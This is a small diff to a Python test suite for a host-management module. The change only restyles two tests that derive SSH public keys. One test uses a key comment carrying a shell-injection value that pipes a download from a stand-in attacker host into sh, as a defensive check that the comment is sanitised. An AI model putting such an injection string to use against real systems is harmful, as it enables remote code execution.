@@ -181,8 +181,9 @@ class TestHostGeneratedKey(TransactionCase):
         key = asyncssh.generate_private_key(
             "ssh-ed25519", comment="x' ; curl https://evil.example | sh ; echo '",
         )
-        host = self._host(login_type="ssh_key", key_file=_key_file_of(key))
-        public = host._ssh_public_key()
+        public = self._host(
+            login_type="ssh_key", key_file=_key_file_of(key)
+        )._ssh_public_key()
         kind, data, comment = public.split(" ")
         self.assertEqual((kind, comment), ("ssh-ed25519", COMMENT))
         self.assertEqual(
@@ -194,8 +195,9 @@ class TestHostGeneratedKey(TransactionCase):
     def test_public_half_of_an_ecdsa_key(self):
         """A key of another type the panel connects with shows its half too."""
         key = asyncssh.generate_private_key("ecdsa-sha2-nistp256")
-        host = self._host(login_type="ssh_key", key_file=_key_file_of(key))
-        public = host._ssh_public_key()
+        public = self._host(
+            login_type="ssh_key", key_file=_key_file_of(key)
+        )._ssh_public_key()
         self.assertTrue(public.startswith("ecdsa-sha2-nistp256 "), public)
         self.assertTrue(public.endswith(f" {COMMENT}"), public)
 
